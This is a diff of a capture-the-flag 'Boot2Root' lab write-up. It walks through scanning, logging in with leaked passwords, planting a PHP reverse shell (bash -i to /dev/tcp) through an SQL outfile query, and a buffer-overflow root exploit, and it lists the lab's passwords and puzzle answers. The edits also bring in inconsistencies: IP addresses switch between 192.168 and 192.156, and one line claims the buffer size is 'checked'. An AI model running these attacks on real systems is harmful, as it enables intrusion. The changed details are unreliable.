@@ -1,32 +1,38 @@
 # Boot2Root WriteUp 1
+
+## Step 0
+Before doing anything, we need to setup the VM. More specificaly:
+ - Switch the Network Adaptater to: `Host-Only Adapter` (Create the adaptater if it doesnt exist)
+ - Allocate 10 core to the VM for the later dirtycow exploit
+
 ## Step 1
-We dont have any ip addres and any user to connect to. We need to find the local ip of the VM:
+We dont have any ip address and any user to connect to. We need to find the local ip of the VM:
     
     $> ip addr show
         ...
         vboxnet0 ...
-        inet 192.168.56.1/24 ...
+        inet 192.156.56.1/24 ...
         ....
-We now have the addres ip of the Virtual Box network interface.
+We now have the address ip of the Virtual Box network interface.
 
 We will use nmap to scan the range of ip and find some machine on it:
 
-    $> nmap 192.168.56.1/24
+    $> nmap 192.156.56.1/24
         ...
-        192.168.56.101
+        192.156.56.*
         ...
 
-There it is we have our ip address: `192.168.56.101` !
+There it is we have our ip address: `192.156.56.*` !
 ## Step 2
 Now that we have the ip address of our VM we can scan it using dirb inside a kali container:
 
     $> docker run -it kalilinux/kali-rolling:latest
     $> apt update && apt install -y dirb
-    $> dirp https://192.156.56.101
+    $> dirp https://192.156.56.*
     ...
-    https://192.156.56.101/forum
-    https://192.156.56.101/phpmyadmin
-    https://192.156.56.101/webmail
+    https://192.156.56.*/forum
+    https://192.156.56.*/phpmyadmin
+    https://192.156.56.*/webmail
     ...
 Great we have 3 places to analyze !
 
@@ -53,7 +59,7 @@ Lets try to connect through `/webmail` with :
     email: laurie@borntosec.net
     password: !q\]Ej?*5K5cy*AJ
 
-Gotem ! We have acces to his mails.
+Gotem ! We have access to his mails.
 
 The only relevent mail here is `access db` which contains a password for the `root` user of the database.
 
@@ -64,7 +70,7 @@ The only relevent mail here is `access db` which contains a password for the `ro
 
 We use the the previous password to access the database with a root access.
 
-Thanks to this root access, inserting some php file is now easy.
+Thanks to this database root access, inserting some php file is now easy.
 Lets create a `temp` database and run this querry on it:
 
     SQL>SELECT "<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.56.1/4243 0>&1'"); ?>" into outfile "/var/www/forum/templates_c/reverse.php"
@@ -84,7 +90,7 @@ When looking around, we find this file
 
     $> /home/LOOKATME/password
 
-This file provide all the required information to connect to lmezard in the VM (not through ssh)
+This file provide all the required information to connect to `lmezard` in the VM (not through ssh)
 
     uesrname: lmezard
     password: G!@M6f4Eatau{sF"
@@ -111,9 +117,9 @@ so the result is :
 
 ## Step 8
 
-There is a `bomb` that will explore !
+There is a `bomb` that will explode !
 
-We need to reverse engineering the bin `bomb` to defuse it and acces the next users.
+We need to reverse engineering the binary `bomb` to defuse it and access the next users.
 
 - Phase 1: Public speaking is very easy.
  
@@ -127,9 +133,9 @@ We need to reverse engineering the bin `bomb` to defuse it and acces the next us
 
 - Phase 6: 4 2 6 3 1 5
 
-There is a secret phase with we use specific answers.
+There is a secret phase if we use specific answers.
 
-- Phase Secret: 1001
+- Secret Phase: 1001
 
 We follow the README instruction and concatenate every answers without space
 
@@ -146,7 +152,7 @@ We use a python script called `draw.py` to print the movements of the `turtle`.
 
 The word `SLASH` is hidded in this picture.
 
-We MD5 `SLASH` thanks to the hint at the hend of turtle file that say : Can you `digest` the `message` ? MD5 stand for Message Digest 5.
+We MD5 `SLASH` thanks to the hint at the end of turtle file that say : Can you `digest` the `message` ? MD5 stand for Message Digest 5.
 
     username: zaz
     password: 646da671ca01bb5d84dbb5fb2238dc8e
@@ -158,10 +164,10 @@ When reverse engineering we see that the program is vulnerable to a buffer overf
 
 ![](image-2.png)
 
-The size writen inside buf is controled by the user and not by the program.
-We use `payload.py` to generate a payload that will change the return addres of strcpy by our shellcode.
+The size writen inside buf is controled by the user and checked by the program.
+We use `payload.py` to generate a payload that will change the return address of strcpy by our shellcode.
 
-Our shellcode will jump to the function `system` with the addres of the string `"/bin/sh"`. This will effectively give us a root shell access.
+Our shellcode will jump to the function `system` with the address of the string `"/bin/sh"`. This will effectively give us a root shell access.
 
     $> python payload.py
     $> ./exploit_me $(cat payload)
